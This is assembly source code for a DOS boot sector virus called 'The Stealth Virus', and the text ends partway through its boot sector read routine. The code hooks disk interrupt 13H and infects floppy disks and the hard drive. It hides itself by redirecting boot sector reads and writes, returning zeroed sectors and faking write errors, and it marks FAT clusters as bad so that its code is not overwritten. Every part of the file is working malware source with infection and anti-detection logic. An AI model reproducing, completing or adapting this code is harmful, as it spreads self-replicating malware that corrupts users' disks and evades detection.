;The Stealth Virus is a boot sector virus which remains resident in memory
;after boot so it can infect disks. It hides itself on the disk and includes
;special anti-detection interrupt traps so that it is very difficult to
;locate. This is a very infective and crafty virus.

COMSEG  SEGMENT PARA
        ASSUME  CS:COMSEG,DS:COMSEG,ES:COMSEG,SS:COMSEG

        ORG     100H

START:
        jmp     BOOT_START

;*******************************************************************************
;* BIOS DATA AREA                                                              *
;*******************************************************************************

        ORG     413H

MEMSIZE DW      640                     ;size of memory installed, in KB

;*******************************************************************************
;* VIRUS CODE STARTS HERE                                                      *
;*******************************************************************************

        ORG     7000H

STEALTH:                                ;A label for the beginning of the virus


;*******************************************************************************
;Format data consists of Track #, Head #, Sector # and Sector size code (2=512b)
;for every sector on the track. This is put at the very start of the virus so
;that when sectors are formatted, we will not run into a DMA boundary, which
;would cause the format to fail. This is a false error, but one that happens
;with some BIOS's, so we avoid it by putting this data first.
FMT_12M:        ;Format data for Track 80, Head 1 on a 1.2 Meg diskette,
        DB      80,1,1,2, 80,1,2,2, 80,1,3,2, 80,1,4,2, 80,1,5,2, 80,1,6,2

FMT_360:        ;Format data for Track  40, Head 1 on a 360K diskette
        DB      40,1,1,2, 40,1,2,2, 40,1,3,2, 40,1,4,2, 40,1,5,2, 40,1,6,2


;*******************************************************************************
;* INTERRUPT 13H HANDLER                                                       *
;*******************************************************************************

OLD_13H DD      ?                       ;Old interrupt 13H vector goes here

INT_13H:
        sti
        cmp     ah,2                    ;we want to intercept reads
        jz      READ_FUNCTION
        cmp     ah,3                    ;and writes to all disks
        jz      WRITE_FUNCTION
I13R:   jmp     DWORD PTR cs:[OLD_13H]


;*******************************************************************************
;This section of code handles all attempts to access the Disk BIOS Function 2,
;(Read). It checks for several key situations where it must jump into action.
;they are:
;       1) If an attempt is made to read the boot sector, it must be processed
;          through READ_BOOT, so an infected boot sector is never seen. Instead,
;          the original boot sector is read.
;       2) If any of the infected sectors, Track 0, Head 0, Sector 2-7 on
;          drive C are read, they are processed by READ_HARD, so the virus
;          code is never seen on the hard drive.
;       3) If an attempt is made to read Track 1, Head 0, Sector 1 on the
;          floppy, this routine checks to see if the floppy has already been
;          infected, and if not, it goes ahead and infects it.

READ_FUNCTION:                                  ;Disk Read Function Handler
        cmp     dh,0                            ;is it head 0?
        jnz     I13R                            ;nope, let BIOS handle it
        cmp     ch,1                            ;is it track 1?
        jz      RF0                             ;yes, go do special processing
        cmp     ch,0                            ;is it track 0?
        jnz     I13R                            ;no, let BIOS handle it
        cmp     cl,1                            ;track 0, is it sector 1
        jz      READ_BOOT                       ;yes, go handle boot sector read
        cmp     dl,80H                          ;no, is it hard drive c:?
        jz      RF1                             ;yes, go check further
        jmp     I13R                            ;else let BIOS handle it

RF0:    cmp     dl,80H                          ;is it hard disk?
        jnc     I13R                            ;yes, let BIOS handle read
        cmp     cl,1                            ;no, floppy, is it sector 1?
        jnz     I13R                            ;no, let BIOS handle it
        call    CHECK_DISK                      ;is floppy already infected?
        jz      I13R                            ;yes so let BIOS handle it
        call    INFECT_FLOPPY                   ;no, go infect the diskette
        jmp     SHORT I13R                      ;and then let BIOS do the read

RF1:    cmp     cl,8                            ;sector < 8?
        jnc     I13R                            ;nope, let BIOS handle it
        jmp     READ_HARD                       ;yes, divert read on the C drive


;*******************************************************************************
;This section of code handles all attempts to access the Disk BIOS Function 3,
;(Write). It checks for two key situations where it must jump into action. They
;are:
;       1) If an attempt is made to write the boot sector, it must be processed
;          through WRITE_BOOT, so an infected boot sector is never overwritten.
;          instead, the write is redirected to where the original boot sector is
;          hidden.
;       2) If any of the infected sectors, Track 0, Head 0, Sector 2-7 on
;          drive C are written, they are processed by WRITE_HARD, so the virus
;          code is never overwritten.

WRITE_FUNCTION:                                 ;BIOS Disk Write Function
        cmp     dh,0                            ;is it head 0?
        jnz     I13R                            ;nope, let BIOS handle it
        cmp     ch,0                            ;is it track 0?
        jnz     I13R                            ;nope, let BIOS handle it
        cmp     cl,1                            ;is it sector 1
        jnz     WF1                             ;nope, check for hard drive
        jmp     WRITE_BOOT                      ;yes, go handle boot sector read
WF1:    cmp     dl,80H                          ;is it the hard drive c: ?
        jnz     I13R                            ;no, another hard drive
        cmp     cl,8                            ;sector < 8?
        jnc     I13R                            ;nope, let BIOS handle it
        jmp     WRITE_HARD                      ;else take care of writing to C:


;*******************************************************************************
;This section of code handles reading the boot sector. There are three
;possibilities: 1) The disk is not infected, in which case the read should be
;passed directly to BIOS, 2) The disk is infected and only one sector is
;requested, in which case this routine figures out where the original boot
;sector is and reads it, and 3) The disk is infected and more than one sector
;is requested, in which case this routine breaks the read up into two calls to
;the ROM BIOS, one to fetch the original boot sector, and another to fetch the
;additional sectors being read. One of the complexities in this last case is
;that the routine must return the registers set up as if only one read had
;been performed.
;  To determine if the disk is infected, the routine reads the real boot sector
;into SCRATCHBUF and calls IS_VBS. If that returns affirmative (z set), then
;this routine goes to get the original boot sector, etc., otherwise it calls ROM
;BIOS and allows a second read to take place to get the boot sector into the
;requested buffer at es:bx.

READ_BOOT:
        push    ax                              ;save registers
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    bp

        push    cs                              ;set ds=es=cs
        pop     es
        push    cs
        pop     ds
        mov     bp,sp                           ;and bp=sp

RB001:  mov     al,dl
        call    GET_BOOT_SEC                    ;read the real boot sector
        jnc     RB01                            ;ok, go on
        call    GET_BOOT_SEC                    ;do it again to make sure
        jnc     RB01                            ;ok, go on
        jmp     RB_GOON                         ;error, let BIOS return err code
RB01:   call    IS_VBS                          ;is it the viral boot sector?
        jz      RB02                            ;yes, jump
        jmp     RB_GOON                         ;no, let ROM BIOS read sector
RB02:;  mov     bx,OFFSET SCRATCHBUF + (OFFSET DR_FLAG - OFFSET BOOT_START)	
	mov	bx,OFFSET SB_DR_FLAG		;required instead of ^ for a86

        mov     al,BYTE PTR [bx]                ;get disk type of disk being
        cmp     al,80H                          ;read, and make an index of it
        jnz     RB1
        mov     al,4
RB1:    mov     bl,3                            ;to look up location of boot sec
        mul     bl
        add     ax,OFFSET BOOT_SECTOR_LOCATION  ;ax=@BOOT_SECTOR_LOCATION table
        mov     bx,ax
        mov     ch,[bx]                         ;get track of orig boot sector
        mov     dh,[bx+1]                       ;get head of orig boot sector
        mov     cl,[bx+2]                       ;get sector of orig boot sector
        mov     dl,ss:[bp+6]                    ;get drive from original spec
        mov     bx,ss:[bp+10]                   ;get read buffer offset
        mov     ax,ss:[bp+2]                    ;and segment
        mov     es,ax                           ;from original specification
        mov     ax,201H                         ;prepare to read 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;do BIOS int 13H
        mov     al,ss:[bp+12]                   ;see if original request
        cmp     al,1                            ;was for more than one sector
        jz      RB_EXIT                         ;no, go exit

READ_1NEXT:                                     ;more than 1 sec requested, so
        pop     bp                              ;read the rest as a second call
        pop     es                              ;to BIOS
        pop     ds
        pop     dx                              ;first restore these registers
        pop     cx
        pop     bx
        pop     ax

        add     bx,512                          ;prepare to call BIOS for
        push    ax                              ;balance of read
        dec     al                              ;get registers straight for it
        inc     cl

        cmp     dl,80H                          ;is it the hard drive?
        jnz     RB15                            ;nope, go handle floppy

        push    bx                              ;handle an infected hard drive
        push    cx                              ;by faking read on extra sectors
        push    dx                              ;and returning a block of 0's
        push    si
        push    di
        push    ds
        push    bp

        push    es
        pop     ds                              ;ds=es

        mov     BYTE PTR [bx],0                 ;set first byte in buffer = 0
        mov     si,bx
        mov     di,bx
        inc     di
        mov     ah,0                            ;ax=number of sectors to read
        mov     bx,512                          ;bytes per sector
        mul     bx                              ;# of bytes to read in dx:ax<64K
        mov     cx,ax
        dec     cx                              ;number of bytes to move in cx
        rep     movsb                           ;fill buffer with 0's

        clc                                     ;clear c, fake read successful
        pushf                                   ;then restore everyting properly
        pop     ax                              ;first set flag register
        mov     ss:[bp+20],ax                   ;as stored on the stack
        pop     bp                              ;and pop all registers
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        mov     ah,0
        dec     cl
        sub     bx,512
        iret                                    ;and get out

RB15:                                           ;read next sectors on floppy
        pushf                                   ;call BIOS to
        call    DWORD PTR cs:[OLD_13H]          ;read the rest (must use cs)
        push    ax
        push    bp
        mov     bp,sp
        pushf                                   ;use c flag from BIOS call
        pop     ax                              ;to set c flag on the stack
        mov     ss:[bp+10],ax
        jc      RB2                             ;if error, return ah from 2nd rd
        sub     bx,512                          ;else restore registers so
        dec     cl                              ;it looks as if only one read
        pop     bp                              ;was performed
        pop     ax
        pop     ax                              ;and exit with ah=0 to indicate
        mov     ah,0                            ;successful read
        iret

RB2:    pop     bp                              ;error on 2nd read
        pop     ax                              ;so clean up stack
        add     sp,2                            ;and get out
        iret

RB_EXIT:                                        ;exit from single sector read
        mov     ax,ss:[bp+18]                   ;set the c flag on the stack
        push    ax                              ;to indicate successful read
        popf
        clc
        pushf
        pop     ax
        mov     ss:[bp+18],ax
        pop     bp                              ;restore all registers
        pop     es
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        mov     ah,0
        iret                                    ;and get out

RB_GOON:                                        ;This passes control to BIOS
        pop     bp                              ;for uninfected disks
        pop     es                              ;just restore all registers to
        pop     ds                              ;their original values
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        jmp     I13R                            ;and go jump to BIOS


;*******************************************************************************
;This table identifies where the original boot sector is located for each
;of the various disk types. It is used by READ_BOOT and WRITE_BOOT to redirect
;boot sector reads and writes.

BOOT_SECTOR_LOCATION:
        DB      40,1,6                          ;Track, head, sector, 360K drive
        DB      80,1,6                          ;1.2M drive
        DB      79,1,9                          ;720K drive
        DB      79,1,18                         ;1.44M drive
        DB      0,0,7                           ;Hard drive


;*******************************************************************************
;This routine handles writing the boot sector for all disks. It checks to see
;if the disk has been infected, and if not, allows BIOS to handle the write.
;If the disk is infected, this routine redirects the write to put the boot
;sector being written in the reserved area for the original boot sector. It
;must also handle the writing of multiple sectors properly, just as READ_BOOT
;did.

WRITE_BOOT:
        push    ax                              ;save everything we might change
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    bp
        mov     bp,sp

        push    cs                              ;ds=es=cs
        pop     ds
        push    cs
        pop     es

        mov     al,dl
        call    GET_BOOT_SEC                    ;read the real boot sector
        jnc     WB01
        call    GET_BOOT_SEC                    ;do it again if first failed
        jnc     WB01
        jmp     WB_GOON                         ;error on read, let BIOS take it
WB01:   call    IS_VBS                          ;else, is disk infected?
        jz      WB02                            ;yes
        jmp     WB_GOON                         ;no, let ROM BIOS write sector
WB02:;  mov     bx,OFFSET SCRATCHBUF + (OFFSET DR_FLAG - OFFSET BOOT_START)
	mov	bx,OFFSET SB_DR_FLAG		;required instead of ^ for a86

        mov     al,BYTE PTR [bx]
        cmp     al,80H                          ;infected, so redirect the write
        jnz     WB1
        mov     al,4                            ;make an index of the drive type
WB1:    mov     bl,3
        mul     bl
        add     ax,OFFSET BOOT_SECTOR_LOCATION  ;ax=@table entry
        mov     bx,ax
        mov     ch,[bx]                         ;get the location of original
        mov     dh,[bx+1]                       ;boot sector on disk
        mov     cl,[bx+2]                       ;prepare for the write
        mov     dl,ss:[bp+6]
        mov     bx,ss:[bp+10]
        mov     ax,ss:[bp+2]
        mov     es,ax
        mov     ax,301H
        pushf
        call    DWORD PTR [OLD_13H]             ;and do it
        sti
        mov     dl,ss:[bp+6]
        cmp     dl,80H                          ;was write going to hard drive?
        jnz     WB_15                           ;no
        mov     BYTE PTR [DR_FLAG],80H          ;yes, update partition info
        push    si
        push    di
        mov     di,OFFSET PART                  ;just move it from sec we just
        mov     si,ss:[bp+10]                   ;wrote into the viral boot sec
        add     si,OFFSET PART 
	sub	si,OFFSET BOOT_START
        push    es
        pop     ds
        push    cs
        pop     es                              ;switch ds and es around
        mov     cx,20
        rep     movsw                           ;and do the move
        push    cs
        pop     ds
        mov     ax,301H
        mov     bx,OFFSET BOOT_START
        mov     cx,1                            ;Track 0, Sector 1
        mov     dx,80H                          ;drive 80H, Head 0
        pushf                                   ;go write updated viral boot sec
        call    DWORD PTR [OLD_13H]             ;with new partition info
        pop     di                              ;clean up
        pop     si

WB_15:  mov     al,ss:[bp+12]
        cmp     al,1                            ;was write more than 1 sector?
        jz      WB_EXIT                         ;if not, then exit

WRITE_1NEXT:                                    ;more than 1 sector
        mov     dl,ss:[bp+6]                    ;see if it's the hard drive
        cmp     dl,80H
        jz      WB_EXIT                         ;if so, ignore rest of the write
        pop     bp                              ;floppy drive, go write the rest
        pop     es                              ;as a second call to BIOS
        pop     ds
        pop     dx
        pop     cx                              ;restore all registers
        pop     bx
        pop     ax
        add     bx,512                          ;and modify a few to
        push    ax                              ;drop writing the first sector
        dec     al
        inc     cl
        pushf
        call    DWORD PTR cs:[OLD_13H]          ;go write the rest
        sti
        push    ax
        push    bp
        mov     bp,sp
        pushf                                   ;use c flag from call
        pop     ax                              ;to set c flag on the stack
        mov     ss:[bp+10],ax
        jc      WB2                             ;an error
                                                ;so exit with ah from 2nd int 13
        sub     bx,512
        dec     cl
        pop     bp
        pop     ax
        pop     ax                              ;else exit with ah=0
        mov     ah,0                            ;to indicate success
        iret

WB2:    pop     bp                              ;exit with ah from 2nd
        pop     ax                              ;interrupt
        add     sp,2
        iret


WB_EXIT:                                        ;exit after 1st write
        mov     ax,ss:[bp+18]                   ;set carry on stack to indicate
        push    ax                              ;a successful write operation
        popf
        clc
        pushf
        pop     ax
        mov     ss:[bp+18],ax
        pop     bp                              ;restore all registers and exit
        pop     es
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        mov     ah,0
        iret

WB_GOON:                                        ;pass control to ROM BIOS
        pop     bp                              ;just restore all registers
        pop     es
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        jmp     I13R                            ;and go do it


;*******************************************************************************
;Read hard disk sectors on Track 0, Head 0, Sec > 1. If the disk is infected,
;then instead of reading the true data there, return a block of 0's, since
;0 is the data stored in a freshly formatted but unused sector. This will
;fake the caller out and keep him from knowing that the virus is hiding there.
;If the disk is not infected, return the true data stored in those sectors.

READ_HARD:
        call    CHECK_DISK                      ;see if disk is infected
        jnz     RWH_EX                          ;no, let BIOS handle the read
        push    ax                              ;else save registers
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    bp
        mov     bp,sp
        mov     BYTE PTR es:[bx],0              ;zero the first byte in the blk
        push    es
        pop     ds
        mov     si,bx                           ;set up es:di and ds:si
        mov     di,bx                           ;for a transfer
        inc     di
        mov     ah,0                            ;ax=number of sectors to read
        mov     bx,512                          ;bytes per sector
        mul     bx                              ;number of bytes to read in ax
        mov     cx,ax
        dec     cx                              ;number of bytes to move
        rep     movsb                           ;do fake read of all 0's

        mov     ax,ss:[bp+20]                   ;now set c flag
        push    ax                              ;to indicate succesful read
        popf
        clc
        pushf
        pop     ax
        mov     ss:[bp+20],ax

        pop     bp                              ;restore everything and exit
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        mov     ah,0                            ;set to indicate successful read
        iret

RWH_EX: jmp     I13R                            ;pass control to BIOS


;*******************************************************************************
;Handle writes to hard disk Track 0, Head 0, 1<Sec<8. We must stop the write if
;the disk is infected. Instead, fake the return of an error by setting carry
;and returning ah=4 (sector not found).

WRITE_HARD:
        call    CHECK_DISK                      ;see if the disk is infected
        jnz     RWH_EX                          ;no, let BIOS handle it all
        push    bp                              ;yes, infected, so . . .
        push    ax
        mov     bp,sp
        mov     ax,ss:[bp+8]                    ;get flags off of stack
        push    ax
        popf                                    ;put them in current flags
        stc                                     ;set the carry flag
        pushf
        pop     ax
        mov     ss:[bp+8],ax                    ;and put flags back on stack
        pop     ax
        mov     ah,4                            ;set up sector not found error
        pop     bp
        iret                                    ;and get out of ISR


;*******************************************************************************
;See if disk dl is infected already. If so, return with Z set. This
;does not assume that registers have been saved, and saves/restores everything
;but the flags.

CHECK_DISK:
        push    ax                              ;save everything
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    cs
        pop     ds
        push    cs
        pop     es
        mov     al,dl
        call    GET_BOOT_SEC                    ;read the boot sector
        jnc     CD1
        xor     al,al                           ;act as if infected
        jmp     SHORT CD2                       ;in the event of an error
CD1:    call    IS_VBS                          ;see if viral boot sec (set z)
CD2:    pop     es                              ;restore everything
        pop     ds                              ;except the z flag
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        ret


;*******************************************************************************
;This routine determines from the boot sector parameters what kind of floppy
;disk is in the drive being accessed, and calls the proper infection routine
;to infect the drive. It has no safeguards to prevent infecting an already
;infected disk. the routine CHECK_DISK must be called first to make sure you
;want to infect before you go and do it. This restores all registers to their
;initial state.

INFECT_FLOPPY:
        pushf                                   ;save everything
        push    si
        push    di
        push    ax
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    cs
        pop     es
        push    cs
        pop     ds
        sti
        mov     bx,OFFSET SCRATCHBUF + 13H      ;@ of sec cnt in boot sector
        mov     bx,[bx]                         ;get sector count for this disk
        mov     al,dl
        cmp     bx,720                          ;is it 360K? (720 sectors)
        jnz     IF_1                            ;no, try another possibility
        call    INFECT_360K                     ;yes, infect it
        jmp     SHORT IF_R                      ;and get out
IF_1:   cmp     bx,2400                         ;is it 1.2M? (2400 sectors)
        jnz     IF_2                            ;no, try another possibility
        call    INFECT_12M                      ;yes, infect it
        jmp     SHORT IF_R                      ;and get out
IF_2:   cmp     bx,1440                         ;is it 720K 3 1/2"? (1440 secs)
        jnz     IF_3                            ;no, try another possibility
        call    INFECT_720K                     ;yes, infect it
        jmp     SHORT IF_R                      ;and get out
IF_3:   cmp     bx,2880                         ;is it 1.44M 3 1/2"? (2880 secs)
        jnz     IF_R                            ;no - don't infect this disk
        call    INFECT_144M                     ;yes - infect it
IF_R:   pop     es                              ;restore everyting and return
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        pop     di
        pop     si
        popf
        ret


;*******************************************************************************
;Infect a 360 Kilobyte drive. This is done by formatting Track 40, Head 0,
;Sectors 1 to 6, putting the present boot sector in Sector 6 with the virus
;code in sectors 1 through 5, and then replacing the boot sector on the disk
;with the viral boot sector.

INFECT_360K:
        call    FORMAT_360                      ;format the required sectors
        jc      INF360_EXIT

        mov     bx,OFFSET SCRATCHBUF            ;and go write current boot sec
        push    ax                              ;at Track 40, Head 1, Sector 6
        mov     dl,al
        mov     dh,1                            ;head 1
        mov     cx,2806H                        ;track 40, sector 6
        mov     ax,0301H                        ;BIOS write, for 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        jc      INF360_EXIT

        mov     di,OFFSET BOOT_DATA
;       mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)
	mov	si,OFFSET SB_BOOT_DATA		;required instead of ^ for A86

        mov     cx,32H / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new boot sector
        mov     al,BYTE PTR [SCRATCHBUF + 1FDH] ;copy drive letter there as well
        mov     BYTE PTR [BOOT_START + 1FDH],al
        mov     BYTE PTR [DR_FLAG],0            ;set proper drive type

        push    ax                              ;write new boot sector to disk
        mov     bx,OFFSET BOOT_START            ;buffer for the new boot sector
        call    PUT_BOOT_SEC                    ;go write it to disk
        pop     ax
        jc      INF360_EXIT

        mov     bx,OFFSET STEALTH               ;buffer for 5 secs of stealth
        mov     dl,al                           ;drive to write to
        mov     dh,1                            ;head 1
        mov     cx,2801H                        ;track 40, sector 1
        mov     ax,0305H                        ;write 5 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
INF360_EXIT:
        ret                                     ;all done


;This routine formats Track 40, Head 1 so we can infect a 360k diskette.
FORMAT_360:
        push    ax                              ;save drive number in al
        mov     dl,al                           ;dl=drive no.
        mov     dh,1                            ;head 0
        mov     cx,2801H                        ;track 40, start at sector 1
        mov     ax,0506H                        ;format 6 sectors
        mov     bx,OFFSET FMT_360               ;format info for this sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        ret


;*******************************************************************************
;Infect 1.2 megabyte Floppy Disk Drive AL with this virus. This is essentially
;the same as the 360K case, except we format Track 80 instead of track 40.

INFECT_12M:
        call    FORMAT_12M                      ;format the required sectors
        jc      INF12M_EXIT

        mov     bx,OFFSET SCRATCHBUF            ;and go boot sector at
        push    ax
        mov     dl,al
        mov     dh,1                            ;head 1
        mov     cx,5006H                        ;track 80, sector 6
        mov     ax,0301H                        ;BIOS write, for 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        jc      INF12M_EXIT

        mov     di,OFFSET BOOT_DATA
;       mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)
	mov	si,OFFSET SB_BOOT_DATA		;required instead of ^ for A86

        mov     cx,32H / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new (viral) boot sector
        mov     al,BYTE PTR [SCRATCHBUF + 1FDH] ;copy drive letter there as well
        mov     BYTE PTR [BOOT_START + 1FDH],al
        mov     BYTE PTR [DR_FLAG],1            ;set proper diskette type

        push    ax                              ;and write viral boot sec to disk
        mov     bx,OFFSET BOOT_START            ;buffer for viral boot sector
        call    PUT_BOOT_SEC                    ;go write it to disk
        pop     ax
        jc      INF12M_EXIT

        mov     bx,OFFSET STEALTH               ;buffer for 5 secs of stealth
        mov     dl,al                           ;drive to write to
        mov     dh,1                            ;head 1
        mov     cx,5001H                        ;track 80, sector 1
        mov     ax,0305H                        ;write 5 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
INF12M_EXIT:
        ret                                     ;all done


;Format Track 80, Head 1 so we can infect a 1.2 Meg diskette.
FORMAT_12M:
        push    ax
        mov     dl,al                           ;set drive number
        mov     dh,1                            ;head 1
        mov     cx,5001H                        ;track 80, start at sector 1
        mov     ax,0506H                        ;format 6 sectors
        mov     bx,OFFSET FMT_12M               ;format info for this sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        ret


;*******************************************************************************
;Infect a 3 1/2" 720K drive. This process is a little different than for 5 1/4"
;drives. The virus goes in an existing data area on the disk, so no formatting
;is required. Instead, we 1) Read the boot sector and put it at Track 79, Head 1
;sector 9, 2) Put the five sectors of stealth routines at Track 79, Head 1,
;sector 4-8, 3) Put the viral boot sector at Track 0, Head 0, Sector 1, and
;4) Mark the diskette's FAT to indicate that the last three clusters are bad,
;so that DOS will not attempt to overwrite the virus code.

INFECT_720K:
        mov     bx,OFFSET SCRATCHBUF            ;go write boot sec at
        push    ax
        mov     dl,al
        mov     dh,1                            ;head 1
        mov     cx,4F09H                        ;track 79, sector 9
        mov     ax,0301H                        ;BIOS write, for 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        jc      INF720K_EXIT                    ;exit on error

        push    ax
        mov     di,OFFSET BOOT_DATA
;       mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)
	mov	si,OFFSET SB_BOOT_DATA		;required instead of ^ for A86

        mov     cx,32H / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new boot sector
        mov     al,BYTE PTR [SCRATCHBUF + 1FDH] ;copy drive letter there as well
        mov     BYTE PTR [BOOT_START + 1FDH],al
        mov     BYTE PTR [DR_FLAG],2            ;set proper diskette type
        pop     ax

        push    ax                              ;write new boot sector to disk
        mov     bx,OFFSET BOOT_START
        call    PUT_BOOT_SEC                    ;go write it
        pop     ax
        jc      INF720K_EXIT

        mov     bx,OFFSET STEALTH               ;buffer for 5 sectors of stealth
        mov     dl,al                           ;drive to write to
        mov     dh,1                            ;head 1
        mov     cx,4F04H                        ;track 79, sector 4
        mov     ax,0305H                        ;write 5 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        jc      INF720K_EXIT

        mov     bx,OFFSET SCRATCHBUF            ;now modify the FAT
        mov     ax,0201H                        ;first read 1 sector
        mov     cx,4                            ;track 0, sector 4, head 0
        mov     dh,0
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        jc      INF720K_EXIT

        mov     di,OFFSET SCRATCHBUF + 44       ;modify the FAT in RAM
        mov     ax,7FF7H                        ;marking the last 3 clusters
        stosw                                   ;as bad
        mov     ax,0F7FFH
        stosw
        mov     ax,0FFFH
        stosw

        mov     ax,0301H                        ;now write the FAT back to disk
        mov     cx,4                            ;at track 0, sector 4, head 0
        pushf
        call    DWORD PTR [OLD_13H]
        jc      INF720K_EXIT

        mov     ax,0301H                        ;do second FAT too
        mov     cx,7                            ;at track 0, sector 7, head 0
        pushf
        call    DWORD PTR [OLD_13H]

INF720K_EXIT:
        ret                                     ;all done


;*******************************************************************************
;This routine infects a 1.44 megabyte 3 1/2" diskette. It is essentially the
;same as infecting a 720K diskette, except that the virus is placed in sectors
;13-17 on Track 79, Head 0, and the original boot sector is placed in Sector 18.

INFECT_144M:
        mov     bx,OFFSET SCRATCHBUF            ;go write boot sec at
        push    ax
        mov     dl,al
        mov     dh,1                            ;head 1
        mov     cx,4F12H                        ;track 79, sector 18
        mov     ax,0301H                        ;BIOS write, for 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        jc      INF144M_EXIT

        push    ax
        mov     di,OFFSET BOOT_DATA
;       mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)
	mov	si,OFFSET SB_BOOT_DATA		;required instead of ^ for A86

        mov     cx,32H / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new boot sector
        mov     al,BYTE PTR [SCRATCHBUF + 1FDH] ;copy drive letter there as well
        mov     BYTE PTR [BOOT_START + 1FDH],al
        mov     BYTE PTR [DR_FLAG],3            ;set proper diskette type
        pop     ax

        push    ax                              ;and write new boot sector to disk
        mov     bx,OFFSET BOOT_START
        call    PUT_BOOT_SEC                    ;go write it to disk
        pop     ax
        jc      INF144M_EXIT

        mov     bx,OFFSET STEALTH               ;buffer for 5 sectors of stealth
        mov     dl,al                           ;drive to write to
        mov     dh,1                            ;head 1
        mov     cx,4F0DH                        ;track 79, sector 13
        mov     ax,0305H                        ;write 5 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)

        mov     bx,OFFSET SCRATCHBUF            ;now modify the FAT
        mov     ax,0201H                        ;first read 1 sector
        mov     cx,0AH                          ;track 0, sector 10, head 0
        mov     dh,0
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        jc      INF144M_EXIT

        mov     di,OFFSET SCRATCHBUF + 0A8H     ;modify the FAT in RAM
        mov     ax,es:[di]
        and     ax,000FH
        add     ax,0FF70H
        stosw
        mov     ax,07FF7H                       ;marking the last 6 clusters
        stosw                                   ;as bad
        mov     ax,0F7FFH
        stosw
        mov     ax,0FF7FH
        stosw
        mov     ax,0FF7H
        stosw

        mov     ax,0301H                        ;now write the FAT back to disk
        mov     cx,0AH                          ;at track 0, sector 10, head 0
        pushf
        call    DWORD PTR [OLD_13H]
        jc      INF144M_EXIT

        mov     ax,0301H                        ;do second FAT too
        mov     cx,1                            ;at track 0, sector 1, head 1
        mov     dh,1
        pushf
        call    DWORD PTR [OLD_13H]


INF144M_EXIT:
        ret                                     ;all done


;*******************************************************************************
;Infect Hard Disk Drive AL with this virus. This involves the following steps:
;A) Read the present boot sector. B) Copy it to Track 0, Head 0, Sector 7.
;C) Copy the disk parameter info into the viral boot sector in memory. D) Copy
;the viral boot sector to Track 0, Head 0, Sector 1. E) Copy the STEALTH
;routines to Track 0, Head 0, Sector 2, 5 sectors total.

INFECT_HARD:
        mov     al,80H                          ;set drive type flag to hard disk
        mov     BYTE PTR [DR_FLAG],al           ;cause that's where it's going

        call    GET_BOOT_SEC                    ;read the present boot sector

        mov     bx,OFFSET SCRATCHBUF            ;and go write it at
        push    ax
        mov     dl,al
        mov     dh,0                            ;head 0
        mov     cx,0007H                        ;track 0, sector 7
        mov     ax,0301H                        ;BIOS write, for 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax

        push    ax
        mov     di,OFFSET BOOT_DATA
;       mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)
	mov	si,OFFSET SB_BOOT_DATA		;required instead of ^ for A86

        mov     cx,32H / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new boot sector
        mov     di,OFFSET BOOT_START + 200H - 42H
        mov     si,OFFSET SCRATCHBUF + 200H - 42H
        mov     cx,21H                          ;copy partition table
        rep     movsw                           ;to new boot sector too!
        pop     ax

        push    ax                              ;and write viral boot sector
        mov     bx,OFFSET BOOT_START
        call    PUT_BOOT_SEC
        pop     ax

        mov     bx,OFFSET STEALTH               ;buffer for 5 sectors of stealth
        mov     dl,al                           ;drive to write to
        mov     dh,0                            ;head 0
        mov     cx,0002H                        ;track 0, sector 2
        mov     ax,0305H                        ;write 5 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)

        ret


;*******************************************************************************
;This routine determines if a hard drive C: exists, and returns NZ if it does,
;Z if it does not.
IS_HARD_THERE:
        push    ds
        xor     ax,ax
        mov     ds,ax
        mov     bx,475H                         ;Get hard disk count from bios
        mov     al,[bx]                         ;put it in al
        pop     ds
        cmp     al,0                            ;and see if al=0 (no drives)
        ret


;*******************************************************************************
;Read the boot sector on the drive AL into SCRATCHBUF. This routine must
;prserve AL!

GET_BOOT_SEC:
        push    ax
        mov     bx,OFFSET SCRATCHBUF            ;buffer for the boot sector
        mov     dl,al                           ;this is the drive to read from
        mov     dh,0                            ;head 0
        mov     ch,0                            ;track 0
        mov     cl,1                            ;sector 1
